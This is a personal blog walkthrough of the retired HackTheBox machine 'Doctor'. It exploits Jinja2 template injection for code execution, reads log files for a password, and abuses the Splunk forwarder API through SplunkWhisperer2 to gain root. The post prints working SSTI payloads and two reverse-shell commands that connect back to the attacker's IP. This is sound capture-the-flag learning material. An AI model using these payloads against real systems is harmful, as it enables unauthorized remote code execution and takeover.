---
layout: walkthrough
title: HackTheBox - Doctor
date: 2021-02-07 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/doctor.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Doctor --`10.10.10.209`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Cache/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Doctor$ nmap -sC -sV 10.10.10.209
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-11 06:26 EST
Nmap scan report for 10.10.10.209
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.31 seconds
```

</details>

From the output shown above, we can see that the machine is a Linux machine and I added `doctor.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 3 open ports, I started by doing some web enumeration. 

### Basic Web Enumeration
While browsing the web application, I ran the following scans:
* Gobuster
* Nikto

The output of the scans is shown below:

<details>

```bat
gobuster dir -u http://10.10.10.209 -w=/usr/share/seclists/Discovery/Web-C
ontent/raft-small-files.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.209
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/11 06:42:11 Starting gobuster
===============================================================
/index.html (Status: 200)
/contact.html (Status: 200)
/.htaccess (Status: 403)
/. (Status: 200)
/about.html (Status: 200)
/.html (Status: 403)
/blog.html (Status: 200)
/.php (Status: 403)
/services.html (Status: 200)
/.htpasswd (Status: 403)
/.htm (Status: 403)
/.htpasswds (Status: 403)
/.htgroup (Status: 403)
/wp-forum.phps (Status: 403)
/.htaccess.bak (Status: 403)
/.htuser (Status: 403)
===============================================================
2020/12/11 06:45:43 Finished
===============================================================
```
```bat
vagrant@ko:~/Desktop/HackTheBox/Doctor$ gobuster dir -u https://10.10.10.209:8089 -w=/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -k
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.209:8089
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/11 06:51:17 Starting gobuster
===============================================================
/robots.txt (Status: 200)
/v1.01 (Status: 200)
/v2.0 (Status: 200)
/v2.1 (Status: 200)
/v1.1 (Status: 200)
===============================================================
2020/12/11 06:54:43 Finished
===============================================================
```
```bat
vagrant@ko:~/Desktop/HackTheBox/Doctor$ nikto -h 10.10.10.209
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.209
+ Target Hostname:    10.10.10.209
+ Target Port:        80
+ Start Time:         2020-12-11 06:41:44 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 4d88, size: 5afad8bea6589, mtime: gzip
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ 7863 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2020-12-11 07:07:07 (GMT-5) (1523 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

</details>


### Port 8089 - Splund
The following screenshot shows the Universal Forwarder agent, this initial page is accessible without authentication and can be used to enumerate hosts running Splunk Universal Forwarder.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img1.png"  style="width: 75%" />
</p>

From the following post: <https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/>, there appeared to be ways of obtaining credentials using Splunkd:

> The password can also be accessed in hashed form in `Program Files\Splunk\etc\passwd` on Windows hosts, and in `/opt/Splunk/etc/passwd` on Linux and Unix hosts. An attacker can attempt to crack the password using Hashcat, or rent a cloud cracking environment to increase likelihood of cracking the hash. The password is a strong SHA-256 hash and as such a strong, random password is unlikely to be cracked.

Since I didn't have access to the host, it seemed unlikely that this was the initial path that I needed to pursue. Instead, I went back to the `gobuster` output and looked into `robots.txt`. Once again, this didn't provide me with any useful information so I decided to move on to port 80 for the time being.

### Port 80 - Doctors.htb

When browsing to the web application, I was presented with the following web interface:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img2.png"  style="width: 75%" />
</p>

After poking around a bit, I decided to look into the source code. I found the `/js` which had a bunch of files, a screenshot is provided below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img3.png"  style="width: 60%" />
</p>

None of the files contained any useful information so I decided to continue my search. In addition to the above, I was able to retrieve the following usernames:

* info@doctors.htb
* Dr. Jade Guzman
* Dr. Hannah Ford
* Dr. James Wilson

The creator of this box was super sneaky and added an additional domain name -- `doctors.htb` instead of `doctor.htb`. I added this entry to `/etc/hosts` and browsed to the new URL which presented me with a login form:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img4.png"  style="width: 75%" />
</p>

### Server Side Template Injection (SSTI)

I started by doing some basic SQL injection and username/password brute force attempts, however after a few minutes this didn't seem to get me anywhere. After registering a new account for my `hotshoto` user, I was able to access what seemed to be a messaging board. After creating a new test message, it seemed as if it would just post it to the discussion board:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img5.png"  style="width: 75%" />
</p>

I poked around for a while, intercepting the requests, and I stumbled across `http://doctors.htb/archive` in the source code. When reviewing the source code for the `archive` page, I saw that it was outputting the information in XML format:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>Test</title></item>

</channel>

```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img6.png"  style="width: 75%" />
</p>

At this point, I assumed that it was either a XML entity encoding flaw or server side template injection (SSTI). In order to test the theory, I decided to start with a simple multiplication formula within the header and body fields of the messaging board:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img7.png"  style="width: 70%" />
</p>

As shown above, it was almost certainly SSTI, and so I started to investigate potential ways to exploit this vulnerability. Github has an awesome exploitation repository called [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) which had some great information about SSTI. Since the double curly brackets worked when attempting the exploit, I was pretty confident that it was using Jinja2 -- however [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) has a great post on how to test out payloads for different languages.

> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.

The first method that I used was exploiting `config.items()`:

<details>

```xml
HTTP/1.1 200 OK
Date: Fri, 11 Dec 2020 13:51:51 GMT
Server: Werkzeug/1.0.1 Python/3.8.2
Content-Type: text/html; charset=utf-8
Vary: Cookie,Accept-Encoding
Connection: close
Content-Length: 2210


<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>Test dict_items([(&#39;ENV&#39;, &#39;production&#39;), (&#39;DEBUG&#39;, False), (&#39;TESTING&#39;, False), (&#39;PROPAGATE_EXCEPTIONS&#39;, None), (&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;, None), (&#39;SECRET_KEY&#39;, &#39;1234&#39;), (&#39;PERMANENT_SESSION_LIFETIME&#39;, datetime.timedelta(days=31)), (&#39;USE_X_SENDFILE&#39;, False), (&#39;SERVER_NAME&#39;, None), (&#39;APPLICATION_ROOT&#39;, &#39;/&#39;), (&#39;SESSION_COOKIE_NAME&#39;, &#39;session&#39;), (&#39;SESSION_COOKIE_DOMAIN&#39;, False), (&#39;SESSION_COOKIE_PATH&#39;, None), (&#39;SESSION_COOKIE_HTTPONLY&#39;, True), (&#39;SESSION_COOKIE_SECURE&#39;, False), (&#39;SESSION_COOKIE_SAMESITE&#39;, None), (&#39;SESSION_REFRESH_EACH_REQUEST&#39;, True), (&#39;MAX_CONTENT_LENGTH&#39;, None), (&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;, datetime.timedelta(seconds=43200)), (&#39;TRAP_BAD_REQUEST_ERRORS&#39;, None), (&#39;TRAP_HTTP_EXCEPTIONS&#39;, False), (&#39;EXPLAIN_TEMPLATE_LOADING&#39;, False), (&#39;PREFERRED_URL_SCHEME&#39;, &#39;http&#39;), (&#39;JSON_AS_ASCII&#39;, True), (&#39;JSON_SORT_KEYS&#39;, True), (&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;, False), (&#39;JSONIFY_MIMETYPE&#39;, &#39;application/json&#39;), (&#39;TEMPLATES_AUTO_RELOAD&#39;, None), (&#39;MAX_COOKIE_SIZE&#39;, 4093), (&#39;MAIL_PASSWORD&#39;, &#39;doctor&#39;), (&#39;MAIL_PORT&#39;, 587), (&#39;MAIL_SERVER&#39;, &#39;&#39;), (&#39;MAIL_USERNAME&#39;, &#39;doctor&#39;), (&#39;MAIL_USE_TLS&#39;, True), (&#39;SQLALCHEMY_DATABASE_URI&#39;, &#39;sqlite://///home/web/blog/flaskblog/site.db&#39;), (&#39;WTF_CSRF_CHECK_DEFAULT&#39;, False), (&#39;SQLALCHEMY_BINDS&#39;, None), (&#39;SQLALCHEMY_NATIVE_UNICODE&#39;, None), (&#39;SQLALCHEMY_ECHO&#39;, False), (&#39;SQLALCHEMY_RECORD_QUERIES&#39;, None), (&#39;SQLALCHEMY_POOL_SIZE&#39;, None), (&#39;SQLALCHEMY_POOL_TIMEOUT&#39;, None), (&#39;SQLALCHEMY_POOL_RECYCLE&#39;, None), (&#39;SQLALCHEMY_MAX_OVERFLOW&#39;, None), (&#39;SQLALCHEMY_COMMIT_ON_TEARDOWN&#39;, False), (&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;, None), (&#39;SQLALCHEMY_ENGINE_OPTIONS&#39;, {})])</title></item>

</channel>

```

</details>

The following post provides a great overview of SSTI, including definitions for `mro` and `subclasses`: <https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee>. I started with the following commands, each time confirming that it functioned correctly within the `/archive` page:

* `config.items()`
* `config.from_object('os')`
* `''.__class__.__mro__ ` 
* `''.__class__.__mro__[1].__subclasses__()` -- this command confirmed that we were exploiting the jinja2 environment as it was listed as a subclass.
`''.__class__.__mro__[1].__subclasses__()[406:]`


For the last part, I used burpsuite repeater to determine that the index for the class `subprocess.Popen` was `407`. With the index for `subprocess.Popen`, I tried using some basic commands. The first one I tried was `ls`:

```python
''.__class__.mro()[1].__subclasses__()[407]('ls',shell=True,stdout=-1).communicate()[0].strip()
```

This resulted in the following XML:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>b&#39;blog\nblog.sh&#39;</title></item>

</channel>
```			
			
Awesome! I now had code execution! The next thing that I needed to do was change it to retrieve a reverse shell. Going back to the `PayloadsAllTheThings` Github page, I used the following reverse shell payload:

```python
% for x  in ().__class__.__base__.__subclasses__() %
% if "warning" in  x.__name__  % 
x()._module.__builtins__['__import__']('os').popen("python3 -c  'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.106\",9001));os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1);  os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",  \"-i\"]);'").read().zfill(417)
% endif %
% endfor %
```

## Lateral Movement using Web

Using this, I successfully managed to obtain a shell on the machine! Running some basic enumeration, we can see the following:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img8.png"  style="width: 60%" />
</p>

<details>

```bat
web@doctor:~$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a; echo " ";echo "groups:";groups;
<;/sbin/ifconfig -a; echo " ";echo "groups:";groups;
 
uname -a:
Linux doctor 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 
hostname:
doctor
 
id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
 
ifconfig:
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.209  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:7a95  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:7a95  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:7a:95  txqueuelen 1000  (Ethernet)
        RX packets 346204  bytes 36971927 (36.9 MB)
        RX errors 0  dropped 29  overruns 0  frame 0
        TX packets 180298  bytes 125705421 (125.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 278990  bytes 73900516 (73.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 278990  bytes 73900516 (73.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
web adm

web@doctor:~$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper

```

</details>

within the `/home/web` directory, I found a file named `blog.sh`. The contents of the file are shown below:

```text
cat blog.sh
#!/bin/bash
SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py
```

Going into `/home/web/blog/flaskblog`, there were several files, including `config.py`: 

```python
cat config.py 

import os

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY')
    WTF_CSRF_CHECK_DEFAULT = False
    SQLALCHEMY_DATABASE_URI = os.environ.get('SQLALCHEMY_DATABASE_URI')
    MAIL_SERVER = ''
    MAIL_PORT = 587
    MAIL_USE_TLS = True
    MAIL_USERNAME = "doctor"
    MAIL_PASSWORD = "doctor"
```

Even though we have a username and password for `doctor`, a quick look at `/etc/passwd` shows us that the user doesn't exist. After uploading `LinPEAS` to the server's `/tmp` directory, the output had a ton of information including the fact that the `adm` group that the `web` user was a part of, was able to read `cups` and `apache2` access logs:

<details>

```text
[+] Readable files belonging to root and readable by me but not world readable                                    
-rw-r----- 1 root adm 92 Sep 28 12:12 /var/log/cups/error_log.1                                                   
-rw-r----- 1 root adm 4512 Sep 28 15:07 /var/log/cups/access_log.1                                                
-rw-r----- 1 root adm 202 Sep 17 00:00 /var/log/cups/access_log.7.gz                                              
-rw-r----- 1 root adm 256 Sep 23 10:46 /var/log/cups/access_log.3.gz                                              
-rw-r----- 1 root adm 102 Jan 11 15:58 /var/log/cups/error_log                                                    
-rw-r----- 1 root adm 267 Sep 23 15:42 /var/log/cups/access_log.2.gz                                              
-rw-r----- 1 root adm 118 Sep 15 11:56 /var/log/cups/error_log.2.gz                                               
-rw-r----- 1 root adm 109 Aug 13 08:13 /var/log/cups/error_log.3.gz                                               
-rw-r----- 1 root adm 224 Jan 11 14:01 /var/log/cups/access_log                                                   
-rw-r----- 1 root adm 204 Sep 18 00:00 /var/log/cups/access_log.6.gz                                              
-rw-r----- 1 root adm 190 Sep 19 00:00 /var/log/cups/access_log.5.gz
-rw-r----- 1 root adm 219 Sep 22 10:40 /var/log/cups/access_log.4.gz
-rw-r----- 1 root adm 476 Sep  7 17:46 /var/log/apache2/error.log.10.gz
-rw-r----- 1 root adm 460 Sep 15 00:00 /var/log/apache2/error.log.9.gz
-rw-r----- 1 root adm 270 Aug 18 12:48 /var/log/apache2/access.log.11.gz
-rw-r----- 1 root adm 1933167 Jan 11 15:59 /var/log/apache2/error.log
-rw-r----- 1 root adm 21578 Sep 17 16:23 /var/log/apache2/backup
-rw-r----- 1 root adm 1493 Sep 23 15:20 /var/log/apache2/access.log.2.gz
-rw-r----- 1 root adm 424 Sep 18 00:00 /var/log/apache2/error.log.6.gz
-rw-r----- 1 root adm 3551 Sep 28 15:07 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 6626 Sep 28 15:02 /var/log/apache2/access.log.1
-rw-r----- 1 root adm 230 Aug 21 13:07 /var/log/apache2/error.log.14.gz
-rw-r----- 1 root adm 846 Sep 22 13:03 /var/log/apache2/error.log.3.gz
-rw-r----- 1 root adm 352 Sep 19 00:00 /var/log/apache2/error.log.5.gz
-rw-r----- 1 root adm 17483425 Jan 11 15:59 /var/log/apache2/access.log
-rw-r----- 1 root adm 384 Sep 14 10:07 /var/log/apache2/access.log.6.gz
-rw-r----- 1 root adm 3018 Sep  7 17:24 /var/log/apache2/access.log.7.gz
-rw-r----- 1 root adm 1338 Sep  6 22:46 /var/log/apache2/access.log.8.gz
-rw-r----- 1 root adm 428 Sep 17 00:00 /var/log/apache2/error.log.7.gz
-rw-r----- 1 root adm 1266 Sep  5 11:58 /var/log/apache2/access.log.9.gz
-rw-r----- 1 root adm 655 Sep 22 10:40 /var/log/apache2/error.log.4.gz
-rw-r----- 1 root adm 629 Sep 16 00:00 /var/log/apache2/error.log.8.gz
-rw-r----- 1 root adm 3951 Sep 22 12:58 /var/log/apache2/access.log.3.gz
-rw-r----- 1 root adm 1341 Sep 19 19:17 /var/log/apache2/access.log.4.gz
-rw-r----- 1 root adm 1092 Sep 23 15:42 /var/log/apache2/error.log.2.gz
-rw-r----- 1 root adm 341 Sep  5 00:00 /var/log/apache2/error.log.13.gz
-rw-r----- 1 root adm 680 Sep  5 11:58 /var/log/apache2/error.log.12.gz
-rw-r----- 1 root adm 323 Aug 21 13:00 /var/log/apache2/access.log.10.gz
-rw-r----- 1 root adm 537 Sep  6 22:47 /var/log/apache2/error.log.11.gz
-rw-r----- 1 root adm 664054 Sep 15 14:27 /var/log/apache2/access.log.5.gz
-rw-r----- 1 root adm 320 Sep  6 16:29 /var/log/apt/term.log.1.gz
-rw-r----- 1 root adm 2932 Aug 13 09:16 /var/log/apt/term.log.2.gz
-rw-r----- 1 root adm 0 Sep  7 12:13 /var/log/apt/term.log
```

</details>

Additionally, the `adm` group also had read access to the `/var/log/apache2/backup` file which contained password reset information:

```text
web@doctor:/var/log/apache2$ cat backup | grep pass
cat backup | grep pass
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

## Privilege Escalation through Splunk Forwarders

Using this information, I attempted to authenticate as the `shaun` user using `su`, since shaun was the only user on the host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img9.png"  style="width: 70%" />
</p>

Success! I successfully managed to authenticate as the user:

```bat
shaun@doctor:~$ sudo -l
sudo -l
[sudo] password for shaun: Guitar123

Sorry, user shaun may not run sudo on doctor.
```

I decided to run the `LinPEAS.sh` file that I uploaded previously. One of the interesting service that was running was obviously `splunkd` as we saw initially. Since port 8089 was open and actively serving the API, I decided to search for some Splunkd exploits while I was waiting for LinPEAS to complete. In order to ensure that the user had access to the Splunk API, I attempted to authenticate to the web service:<https://10.10.10.209:8089/services>

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img10.png"  style="width: 70%" />
</p>

Going back to the initial blog post: <https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/>, it showed that the Splunkd API could be abused by anyone who had access to the API:

> The Splunk Universal Forwarder Agent (UF) allows authenticated remote users to send single commands or scripts to the agents through the Splunk API. The UF agent doesn’t validate connections coming are coming from a valid Splunk Enterprise server, nor does the UF agent validate the code is signed or otherwise proven to be from the Splunk Enterprise server. This allows an attacker who gains access to the UF agent password to run arbitrary code on the server as SYSTEM or root, depending on the operating system.

A bit of Google searching provided me with the following Github page which aimed to exploit this service: <https://github.com/cnotin/SplunkWhisperer2>. The help commands are shown below:

<details>

```python
vagrant@ko:~/Desktop/HackTheBox/Doctor/SplunkWhisperer2/PySplunkWhisperer2$ python3 PySplunkWhisperer2_remote.py 
usage: PySplunkWhisperer2_remote.py [-h] [--scheme SCHEME] --host HOST [--port PORT] --lhost LHOST
                                    [--lport LPORT] [--username USERNAME] [--password PASSWORD]
                                    [--payload PAYLOAD] [--payload-file PAYLOAD_FILE]
PySplunkWhisperer2_remote.py: error: the following arguments are required: --host, --lhost
```
</details>

The exploit itself looked simple enough so I decided to try it. The command that I used is shown below:

```python
python PySplunkWhisperer2_remote.py --lhost 10.10.14.106 --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.106/1234 0>&1"'
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Doctor/img11.png"  style="width: 70%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.